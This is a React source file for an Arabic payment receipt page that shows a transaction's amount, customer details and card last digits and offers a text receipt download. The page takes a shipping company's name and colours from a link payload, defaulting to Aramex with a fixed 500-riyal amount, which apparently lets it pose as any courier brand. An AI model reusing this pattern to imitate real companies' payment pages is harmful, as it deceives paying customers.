import { useParams, useNavigate } from "react-router-dom";
import { Button } from "@/components/ui/button";
import { Card } from "@/components/ui/card";
import { getServiceBranding } from "@/lib/serviceLogos";
import DynamicPaymentLayout from "@/components/DynamicPaymentLayout";
import { useLink } from "@/hooks/useSupabase";
import { CheckCircle, Download, ArrowLeft, CreditCard, Calendar, Hash } from "lucide-react";

const PaymentReceiptPage = () => {
  const { id } = useParams();
  const navigate = useNavigate();
  const { data: linkData } = useLink(id);
  
  const customerInfo = JSON.parse(sessionStorage.getItem('customerInfo') || '{}');
  const serviceKey = linkData?.payload?.service_key || customerInfo.service || 'aramex';
  const serviceName = linkData?.payload?.service_name || serviceKey;
  const branding = getServiceBranding(serviceKey);
  const shippingInfo = linkData?.payload as any;
  const amount = shippingInfo?.cod_amount || 500;
  const formattedAmount = `${amount} ر.س`;
  
  const handleDownload = () => {
    // Create a simple receipt content
    const receiptContent = `
إيصال دفع - ${serviceName}
=====================================
رقم المعاملة: ${id}
التاريخ: ${new Date().toLocaleString('ar-SA')}
المبلغ: ${formattedAmount}
اسم العميل: ${customerInfo.name || 'غير محدد'}
الهاتف: ${customerInfo.phone || 'غير محدد'}
البريد الإلكتروني: ${customerInfo.email || 'غير محدد'}
    `.trim();
    
    const blob = new Blob([receiptContent], { type: 'text/plain;charset=utf-8' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `receipt-${id}.txt`;
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    URL.revokeObjectURL(url);
  };
  
  return (
    <DynamicPaymentLayout
      serviceName={serviceName}
      serviceKey={serviceKey}
      amount={formattedAmount}
      title="إيصال الدفع"
      description={`تم الدفع بنجاح لخدمة ${serviceName}`}
      icon={<CheckCircle className="w-7 h-7 sm:w-10 sm:h-10 text-white" />}
      showHero={false}
    >
      {/* Success Icon */}
      <div className="text-center mb-6 sm:mb-8">
        <div 
          className="w-20 h-20 sm:w-24 sm:h-24 rounded-full mx-auto mb-4 flex items-center justify-center shadow-lg"
          style={{
            background: `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`
          }}
        >
          <CheckCircle className="w-10 h-10 sm:w-12 sm:h-12 text-white" />
        </div>
        <h1 className="text-2xl sm:text-3xl font-bold mb-2" style={{ color: branding.colors.primary }}>
          تم الدفع بنجاح!
        </h1>
        <p className="text-sm sm:text-base text-muted-foreground">
          شكراً لك على استخدام خدمة {serviceName}
        </p>
      </div>

      {/* Receipt Details */}
      <Card className="p-4 sm:p-6 mb-6" style={{ borderColor: branding.colors.primary }}>
        <div className="space-y-4">
          {/* Transaction ID */}
          <div className="flex items-center justify-between py-2 border-b">
            <div className="flex items-center gap-2">
              <Hash className="w-4 h-4 text-muted-foreground" />
              <span className="text-sm font-medium">رقم المعاملة</span>
            </div>
            <span className="font-mono text-sm">{id}</span>
          </div>
          
          {/* Date */}
          <div className="flex items-center justify-between py-2 border-b">
            <div className="flex items-center gap-2">
              <Calendar className="w-4 h-4 text-muted-foreground" />
              <span className="text-sm font-medium">التاريخ والوقت</span>
            </div>
            <span className="text-sm">{new Date().toLocaleString('ar-SA')}</span>
          </div>
          
          {/* Service */}
          <div className="flex items-center justify-between py-2 border-b">
            <span className="text-sm font-medium">الخدمة</span>
            <span className="text-sm font-semibold">{serviceName}</span>
          </div>
          
          {/* Amount */}
          <div className="flex items-center justify-between py-3">
            <span className="text-lg font-bold">المبلغ المدفوع</span>
            <span className="text-2xl font-bold" style={{ color: branding.colors.primary }}>
              {formattedAmount}
            </span>
          </div>
        </div>
      </Card>

      {/* Customer Info */}
      <Card className="p-4 sm:p-6 mb-6">
        <h3 className="font-semibold mb-4 text-sm sm:text-base">تفاصيل العميل</h3>
        <div className="space-y-2 text-sm">
          <div className="flex justify-between">
            <span className="text-muted-foreground">الاسم:</span>
            <span>{customerInfo.name || 'غير محدد'}</span>
          </div>
          <div className="flex justify-between">
            <span className="text-muted-foreground">الهاتف:</span>
            <span>{customerInfo.phone || 'غير محدد'}</span>
          </div>
          <div className="flex justify-between">
            <span className="text-muted-foreground">البريد الإلكتروني:</span>
            <span>{customerInfo.email || 'غير محدد'}</span>
          </div>
          {customerInfo.address && (
            <div className="flex justify-between">
              <span className="text-muted-foreground">العنوان:</span>
              <span className="text-right max-w-[200px]">{customerInfo.address}</span>
            </div>
          )}
        </div>
      </Card>

      {/* Payment Method */}
      <Card className="p-4 sm:p-6 mb-6">
        <h3 className="font-semibold mb-4 text-sm sm:text-base">طريقة الدفع</h3>
        <div className="flex items-center gap-3">
          <CreditCard className="w-5 h-5" style={{ color: branding.colors.primary }} />
          <div>
            <p className="font-medium">بطاقة ائتمان</p>
            <p className="text-sm text-muted-foreground">
              **** **** **** {sessionStorage.getItem('cardLast4') || '****'}
            </p>
          </div>
        </div>
      </Card>

      {/* Action Buttons */}
      <div className="space-y-3">
        <Button
          onClick={handleDownload}
          variant="outline"
          className="w-full"
          style={{
            borderColor: branding.colors.primary,
            color: branding.colors.primary
          }}
        >
          <Download className="w-4 h-4 ml-2" />
          تحميل الإيصال
        </Button>
        
        <Button
          onClick={() => navigate('/')}
          size="lg"
          className="w-full text-sm sm:text-lg py-5 sm:py-7 text-white"
          style={{
            background: `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`
          }}
        >
          <span className="ml-2">العودة للرئيسية</span>
          <ArrowLeft className="w-4 h-4 sm:w-5 sm:h-5 mr-2" />
        </Button>
      </div>
      
      <p className="text-xs text-center text-muted-foreground mt-6">
        سيتم إرسال تفاصيل الحجز إلى بريدك الإلكتروني
      </p>
    </DynamicPaymentLayout>
  );
};

export default PaymentReceiptPage;